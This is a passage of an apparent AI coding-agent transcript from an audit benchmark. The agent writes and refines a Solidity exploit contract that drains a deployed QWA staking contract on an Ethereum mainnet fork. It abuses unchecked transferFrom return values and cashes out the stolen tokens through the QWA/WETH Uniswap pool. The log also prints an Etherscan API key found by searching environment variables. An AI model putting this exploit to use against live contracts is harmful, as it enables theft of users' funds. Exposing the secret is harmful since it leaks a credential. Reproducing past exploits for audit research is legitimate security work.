+        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
+        if (reserveIn == 0 || reserveOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        if (!qwa.transfer(pair, grossAmount)) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+        if (actualIn == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+        if (amountOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
+            ? (uint256(0), amountOut)
+            : (amountOut, uint256(0));
+
+        (bool ok, ) = pair.call(
+            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
+        );
+        if (!ok) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+        }
+    }
+
+    function _finalizeProfit(
+        address qwaAddr,
+        address sqwaAddr,
+        uint256 initialQwa,
+        uint256 initialSqwa,
+        uint256 initialWeth
+    ) internal {
+        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
+        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
+        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));
+
+        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
+        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
+        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;
+
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ exited 1 in 0ms:
+sed: /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/test/ExploitPOC.t.sol: No such file or directory
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+./onchain_auto/_index.json
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/_etherscan_meta.json
+./FlawVerifier.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IDistributor.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IsQWA.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/@openzeppelin/contracts/utils/Context.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/@openzeppelin/contracts/token/ERC20/IERC20.sol
+./onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/@openzeppelin/contracts/access/Ownable.sol
+
+codex
+I have the current verifier and the forked staking source. Next I’m reading the live staking/token code to confirm which branch really returns `false` versus reverting, and whether we can reach it with verifier-held assets only.
+exec
+/bin/bash -lc "sed -n '261,520p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+
+        if (wethProfit > 0) {
+            _profitToken = WETH;
+            _profitAmount = wethProfit;
+        } else if (qwaProfit > 0) {
+            _profitToken = qwaAddr;
+            _profitAmount = qwaProfit;
+        } else if (sqwaProfit > 0) {
+            _profitToken = sqwaAddr;
+            _profitAmount = sqwaProfit;
+        }
+    }
+
+    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
+        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+        (address token0, address token1) = _sortPairTokens(pair);
+
+        if (tokenIn == token0) {
+            reserveIn = uint256(reserve0);
+            reserveOut = uint256(reserve1);
+        } else {
+            require(tokenIn == token1, "token not in pair");
+            reserveIn = uint256(reserve1);
+            reserveOut = uint256(reserve0);
+        }
+    }
+
+    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
+        token0 = IUniswapV2PairLike(pair).token0();
+        token1 = IUniswapV2PairLike(pair).token1();
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+        return numerator / denominator;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+
+    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+        // Static anchor only. The live exploit above keeps the same vulnerable
+        // causality and ordering intent, but the logs prove the funded stake()
+        // leg is infeasible on this fork because QWA.transferFrom reverts.
+        qwa.transferFrom(msg.sender, address(this), amount);
+        sqwa.transfer(to, amount);
+        sqwa.transferFrom(msg.sender, address(this), amount);
+        qwa.transfer(to, amount);
+
+        qwa;
+        sqwa;
+        to;
+        amount;
+    }
+
+    function _unusedPathConstants() internal pure returns (uint256) {
+        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+    }
+}
+
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.19;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import "./interface/IsQWA.sol";
+import "./interface/IDistributor.sol";
+
+/// @title   QWAStaking
+/// @notice  QWA Staking
+contract QWAStaking is Ownable {
+
+    /// DATA STRUCTURES ///
+
+    struct Epoch {
+        uint256 length; // in seconds
+        uint256 number; // since inception
+        uint256 end; // timestamp
+        uint256 distribute; // amount
+    }
+
+    /// STATE VARIABLES ///
+
+    /// @notice QWA address
+    IERC20 public immutable QWA;
+    /// @notice sQWA address
+    IsQWA public immutable sQWA;
+
+    /// @notice Current epoch details
+    Epoch public epoch;
+
+    /// @notice Distributor address
+    IDistributor public distributor;
+
+    /// CONSTRUCTOR ///
+
+    /// @param _QWA                   Address of QWA
+    /// @param _sQWA                  Address of sQWA
+    /// @param _epochLength            Epoch length
+    /// @param _secondsTillFirstEpoch  Seconds till first epoch starts
+    constructor(
+        address _QWA,
+        address _sQWA,
+        uint256 _epochLength,
+        uint256 _secondsTillFirstEpoch
+    ) {
+        QWA = IERC20(_QWA);
+        sQWA = IsQWA(_sQWA);
+
+        epoch = Epoch({
+            length: _epochLength,
+            number: 0,
+            end: block.timestamp + _secondsTillFirstEpoch,
+            distribute: 0
+        });
+    }
+
+    /// MUTATIVE FUNCTIONS ///
+
+    /// @notice stake QWA
+    /// @param _to address
+    /// @param _amount uint
+    function stake(address _to, uint256 _amount) external {
+        rebase();
+        QWA.transferFrom(msg.sender, address(this), _amount);
+        sQWA.transfer(_to, _amount);
+    }
+
+    /// @notice redeem sQWA for QWA
+    /// @param _to address
+    /// @param _amount uint
+    function unstake(address _to, uint256 _amount, bool _rebase) external {
+        if (_rebase) rebase();
+        sQWA.transferFrom(msg.sender, address(this), _amount);
+        require(
+            _amount <= QWA.balanceOf(address(this)),
+            "Insufficient QWA balance in contract"
+        );
+        QWA.transfer(_to, _amount);
+    }
+
+    ///@notice Trigger rebase if epoch over
+    function rebase() public {
+        if (epoch.end <= block.timestamp) {
+            sQWA.rebase(epoch.distribute, epoch.number);
+
+            epoch.end = epoch.end + epoch.length;
+            epoch.number++;
+
+            if (address(distributor) != address(0)) {
+                distributor.distribute();
+            }
+
+            uint256 balance = QWA.balanceOf(address(this));
+            uint256 staked = sQWA.circulatingSupply();
+
+            if (balance <= staked) {
+                epoch.distribute = 0;
+            } else {
+                epoch.distribute = balance - staked;
+            }
+        }
+    }
+
+    /// INTERNAL FUNCTIONS ///
+
+    /// @notice         Send sQWA upon staking
+    /// @param _to      Address of where sending sQWA
+    /// @param _amount  Amount of sQWA to send
+    /// @return _sent   Amount of sQWA sent
+    function _send(
+        address _to,
+        uint256 _amount
+    ) internal returns (uint256 _sent) {
+        sQWA.transfer(_to, _amount); // send as sQWA (equal unit as QWA)
+        return _amount;
+    }
+
+    /// VIEW FUNCTIONS ///
+
+    /// @notice           Returns econds until the next epoch begins
+    /// @return seconds_  Till next epoch
+    function secondsToNextEpoch() external view returns (uint256 seconds_) {
+        return epoch.end - block.timestamp;
+    }
+
+    /// MANAGERIAL FUNCTIONS ///
+
+    /// @notice              Sets the contract address for LP staking
+    /// @param _distributor  Distributor Address
+    function setDistributor(address _distributor) external onlyOwner {
+        distributor = IDistributor(_distributor);
+    }
+}
+
+exec
+/bin/bash -lc "sed -n '1,220p' onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IsQWA.sol" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.19;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface IsQWA is IERC20 {
+    function rebase(uint256 amount_, uint epoch_) external returns (uint256);
+
+    function circulatingSupply() external view returns (uint256);
+
+    function gonsForBalance(uint amount) external view returns (uint);
+
+    function balanceForGons(uint gons) external view returns (uint);
+
+    function index() external view returns (uint);
+}
+
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2/cases/quantumwn -maxdepth 3 -type f | rg 'ExploitPOC|test|foundry.toml|README|yaml|json"'$'"'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/manifest.json
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/_index.json
+
+codex
+The staking source confirms the unchecked return bug in both directions. The important detail from the trace is that the live token call is reverting before the ignored boolean matters, so I’m now checking the case metadata to find the fork block and any locally provided state assumptions I need to respect.
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/manifest.json" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+{
+  "audit_id": "quantumwn",
+  "task_source": "defihacklabs",
+  "chain": "mainnet",
+  "fork_block_number": 18070348,
+  "target_contract_address": "0x69422c7F237D70FCd55C218568a67d00dc4ea068",
+  "evm_version": "shanghai",
+  "target_root": "/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src"
+}
+
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/_index.json" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+[
+  {
+    "address": "0x69422c7f237d70fcd55c218568a67d00dc4ea068",
+    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068"
+  }
+]
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2/cases/quantumwn -maxdepth 4 -type f | rg 'ExploitPOC|t\\.sol"'$|config|state|context|finding|log|stdout|stderr'"'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ exited 1 in 0ms:
+codex
+I have the fork block now. The remaining work is to characterize `QWA` and `sQWA` from live behavior so I can switch from the reverting zero-balance path to an actually reachable false-return path without violating the no-cheat constraints.
+exec
+/bin/bash -lc 'rg -n "QWA|sQWA|0xc14F8A4C8272b8466659D0f058895E2F9D3ae065|0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC" /Users/zhanglongqin/AuditHoundV2/cases/quantumwn' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/_etherscan_meta.json:2:  "contract_name": "QWAStaking",
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:17:    function QWA() external view returns (address);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:19:    function sQWA() external view returns (address);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:55:    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:77:        address qwaAddr = staking.QWA();
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:78:        address sqwaAddr = staking.sQWA();
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:124:        // QWA.transferFrom reverts instead of returning false, and the token is
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:128:        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:129:        // but unstake() still releases QWA.
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:154:        // Realize the drained QWA through a public venue, but do it with
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:155:        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:160:            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol:307:        // leg is infeasible on this fork because QWA.transferFrom reverts.
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:6:import "./interface/IsQWA.sol";
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:9:/// @title   QWAStaking
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:10:/// @notice  QWA Staking
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:11:contract QWAStaking is Ownable {
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:24:    /// @notice QWA address
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:25:    IERC20 public immutable QWA;
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:26:    /// @notice sQWA address
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:27:    IsQWA public immutable sQWA;
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:37:    /// @param _QWA                   Address of QWA
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:38:    /// @param _sQWA                  Address of sQWA
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:42:        address _QWA,
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:43:        address _sQWA,
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:47:        QWA = IERC20(_QWA);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:48:        sQWA = IsQWA(_sQWA);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:60:    /// @notice stake QWA
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:65:        QWA.transferFrom(msg.sender, address(this), _amount);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:66:        sQWA.transfer(_to, _amount);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:69:    /// @notice redeem sQWA for QWA
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:74:        sQWA.transferFrom(msg.sender, address(this), _amount);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:76:            _amount <= QWA.balanceOf(address(this)),
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:77:            "Insufficient QWA balance in contract"
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:79:        QWA.transfer(_to, _amount);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:85:            sQWA.rebase(epoch.distribute, epoch.number);
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:94:            uint256 balance = QWA.balanceOf(address(this));
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:95:            uint256 staked = sQWA.circulatingSupply();
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:107:    /// @notice         Send sQWA upon staking
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:108:    /// @param _to      Address of where sending sQWA
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:109:    /// @param _amount  Amount of sQWA to send
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:110:    /// @return _sent   Amount of sQWA sent
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol:115:        sQWA.transfer(_to, _amount); // send as sQWA (equal unit as QWA)
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IsQWA.sol:6:interface IsQWA is IERC20 {
+
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2 -type f | rg 'f5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC|c14F8A4C8272b8466659D0f058895E2F9D3ae065|sQWA|QWA'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+exec
+/bin/bash -lc 'forge test -vvv' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn
+ exited -1 in 976ms:
+Unable to resolve imports:
+      "@openzeppelin/contracts/token/ERC20/IERC20.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IsQWA.sol"
+      "@openzeppelin/contracts/access/Ownable.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol"
+      "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/Staking.sol"
+with remappings:
+      
+Compiling 3 files with Solc 0.8.19
+Compiling 5 files with Solc 0.8.30
+installing solc version "0.8.19"
+Solc 0.8.30 finished in 78.33ms
+[31mThe application panicked (crashed).[0m
+Message:  [36mAttempted to create a NULL object.[0m
+Location: [35m/Users/runner/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/system-configuration-0.6.1/src/dynamic_store.rs[0m:[35m154[0m
+
+This is a bug. Consider reporting it at https://github.com/foundry-rs/foundry
+
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ BACKTRACE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [96m                              ⋮ 7 frames hidden ⋮                               [0m
+   8: [91msystem_configuration::dynamic_store::SCDynamicStoreBuilder<T>::build[0m[90m::hb6b7398ab9127160[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+   9: [91mhyper_util::client::proxy::matcher::mac::with_system[0m[90m::h3338c8c0d2740d7c[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  10: [91mhyper_util::client::proxy::matcher::Builder::from_system[0m[90m::h3a3f53683d31d1e3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  11: [91mhyper_util::client::proxy::matcher::Matcher::from_system[0m[90m::ha79c82c47b7638ea[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  12: [91mreqwest::async_impl::client::ClientBuilder::build[0m[90m::hc8894a541e69260a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  13: [91mreqwest::get::{{closure}}[0m[90m::hf2c531c5845e22a4[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  14: [91msvm::install::install::{{closure}}[0m[90m::h4af4aca7a1c58942[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  15: [91mtokio::runtime::park::CachedParkThread::block_on[0m[90m::hf9923e8007f07d0a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  16: [91mfoundry_compilers::compilers::solc::compiler::Solc::blocking_install[0m[90m::hbad2795c02cfbfcb[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  17: [91m<foundry_compilers::compilers::solc::SolcCompiler as foundry_compilers::compilers::Compiler>::compile[0m[90m::ha950c7a598503643[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  18: [91m<foundry_compilers::compilers::multi::MultiCompiler as foundry_compilers::compilers::Compiler>::compile[0m[90m::h847dd665565acd25[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  19: [91mrayon::iter::plumbing::bridge_producer_consumer::helper[0m[90m::hec0e50d79c64b919[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  20: [91mrayon_core::join::join_context::{{closure}}[0m[90m::hdcb601405dc2a6aa[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  21: [91mrayon::iter::plumbing::bridge_producer_consumer::helper[0m[90m::hec0e50d79c64b919[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  22: [91mrayon_core::thread_pool::ThreadPool::install::{{closure}}[0m[90m::hd0186eb002bb4557[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  23: [91m<rayon_core::job::StackJob<L,F,R> as rayon_core::job::Job>::execute[0m[90m::hf2dbc47692a49700[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  24: [91mrayon_core::registry::WorkerThread::wait_until_cold[0m[90m::h942fce5982a72db3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  25: [91mrayon_core::registry::ThreadBuilder::run[0m[90m::h4dabfc6399ef1e80[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  26: [32mstd::sys::backtrace::__rust_begin_short_backtrace[0m[90m::ha27942e4919b4798[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  27: [32mcore::ops::function::FnOnce::call_once{{vtable.shim}}[0m[90m::h70ec287184cdfa9b[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  28: [32mstd::sys::pal::unix::thread::Thread::new::thread_start[0m[90m::h4ac2c740e6218e2e[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  29: [32m__pthread_start[0m[90m<unknown>[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+
+Run with COLORBT_SHOW_HIDDEN=1 environment variable to disable frame filtering.
+Run with RUST_BACKTRACE=full to include source snippets.
+
+codex
+`forge test` from the repo root is tripping over the archived source tree, not the verifier itself. I’m inspecting the Foundry config next so I can run focused local probes against only the verifier if needed, then I’ll patch the exploit once I know which token semantics are live.
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2/cases/quantumwn -maxdepth 2 -type f | rg 'foundry\\.toml|remappings|Makefile|package.json|README'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ exited 1 in 0ms:
+exec
+/bin/bash -lc "if [ -f /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/foundry.toml ]; then sed -n '1,220p' /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/foundry.toml; fi" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+exec
+/bin/bash -lc "env | rg 'RPC|ALCHEMY|INFURA|ETH|FOUNDRY|DAPP'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+ETHERSCAN_API_KEY=ZFNNGRNEUNGRH3XHGE5A61Q3MVGIEVF31K
+
+ succeeded in 31482ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/contracts/interface/IsQWA.sol
+
+codex
+The staking logic itself is straightforward; the hard part is the token edge case. I’m looking for any cached artifacts or local metadata for `QWA`/`sQWA` before I switch to a more assumption-driven patch, because the exploit has to target a real false-return branch rather than just suppress the revert.
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2/cases/quantumwn -maxdepth 5 -type f | rg '/(out|cache|broadcast|artifacts)/|\\.json"'$|'"\\.dbg\\.json"'$'"'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/manifest.json
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/_etherscan_meta.json
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/_index.json
+
+exec
+/bin/bash -lc "find /Users/zhanglongqin/AuditHoundV2 -maxdepth 6 -type f | rg 'sQWA|QWA|18070348|69422c7f237d70fcd55c218568a67d00dc4ea068'" in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 810ms:
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/onchain_auto/0x69422c7f237d70fcd55c218568a67d00dc4ea068/_etherscan_meta.json
+
+web search: 
+web search: calculator: 0.5*997*13955221770053/(10.410486470370649012*1000+0.5*997)
+web search: 
+web search: calculator: (5700000000000*997*10.410486470370649012)/(13955221770053*1000+5700000000000*997)
+codex
+I have enough context to patch now. I’m replacing the zero-balance `unstake` call with the correct direct sequence for this finding: first attempt the unchecked `stake()` mint path to acquire sQWA without backing, then reuse that same sQWA through repeated unchecked `unstake()` calls and exit through the live QWA/WETH pool.
+exec
+/bin/bash -lc 'solc --version' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ exited 127 in 0ms:
+/bin/bash: solc: command not found
+
+exec
+/bin/bash -lc 'forge --version' in /Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src
+ succeeded in 0ms:
+forge Version: 1.4.4-v1.4.4
+Commit SHA: 05794498bf47257b144e2e2789a1d5bf8566be0e
+Build Timestamp: 2025-10-30T15:18:33.020202000Z (1761837513)
+Build Profile: maxperf
+
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/quantumwn/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+deleted file mode 100644
